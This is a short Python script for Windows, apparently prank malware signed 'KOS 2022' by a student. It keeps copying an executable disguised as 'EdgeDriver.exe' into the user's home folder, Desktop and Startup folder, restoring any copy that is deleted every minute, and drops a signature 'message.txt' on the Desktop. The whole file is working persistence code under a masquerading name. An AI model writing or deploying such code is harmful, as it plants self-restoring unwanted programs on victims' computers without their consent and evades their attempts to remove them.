import os
import shutil
import time

current = os.path.dirname(os.path.realpath(__file__))
desk = os.path.join(os.path.expanduser('~'),'Desktop')
start = os.path.join(os.path.expanduser('~'),'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
drive = os.path.expanduser('~')

#current = current + '\\'
drive = drive + '\\'
desk = desk + '\\'
start = start + '\\'

exename = 'EdgeDriver.exe'
#exename = 'test127.py'

if os.path.isfile(desk + exename):
    current = desk
elif os.path.isfile(start + exename):
    current = start
elif os.path.isfile(drive + exename):
    current = drive

temp = 0
if os.path.isfile(drive + exename):
    if os.path.isfile(desk + exename):
        if os.path.isfile(start + exename):
            temp = 1

if temp == 1:
    if current == desk:
        f = open(desk+'message.txt','w',encoding='utf-8')
        f.write('K O S   2 0 2 2\n')
        f.write('동성고 재학생 6rOg7YOc7Jqx [B64]\n')
        f.write('2022.04.20\n')
        f.close()
        time.sleep(3)

for i in range(0,100000):
    time.sleep(1)
    if not os.path.isfile(drive + exename):
        shutil.copy2(current + exename, drive + exename)
        time.sleep(5)
    if not os.path.isfile(desk + exename):
        shutil.copy2(current + exename, desk + exename)
        time.sleep(5)
    if not os.path.isfile(start + exename):
        shutil.copy2(current + exename, start + exename)
        time.sleep(5)
    time.sleep(60)
